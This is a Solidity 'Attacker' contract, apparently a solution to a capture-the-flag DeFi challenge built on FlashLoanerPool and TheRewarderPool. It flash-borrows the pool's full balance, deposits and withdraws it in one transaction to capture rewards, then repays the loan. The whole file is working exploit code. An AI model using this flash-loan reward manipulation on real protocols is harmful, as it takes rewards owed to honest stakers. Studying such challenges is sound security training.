//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {FlashLoanerPool} from "../src/FlashLoanerPool.sol";
import {TheRewarderPool} from "../src/TheRewarderPool.sol";

contract Attacker {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanPool;

    constructor(address _rewarderPool, address _flashLoanPool) payable {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);

        flashLoanPool.liquidityToken().approve(
            address(flashLoanPool),
            type(uint256).max
        );
        flashLoanPool.liquidityToken().approve(
            address(rewarderPool),
            type(uint256).max
        );
    }

    function attack() external {
        flashLoanPool.flashLoan(
            flashLoanPool.liquidityToken().balanceOf(address(flashLoanPool))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        flashLoanPool.liquidityToken().transfer(address(flashLoanPool), amount);
    }
}
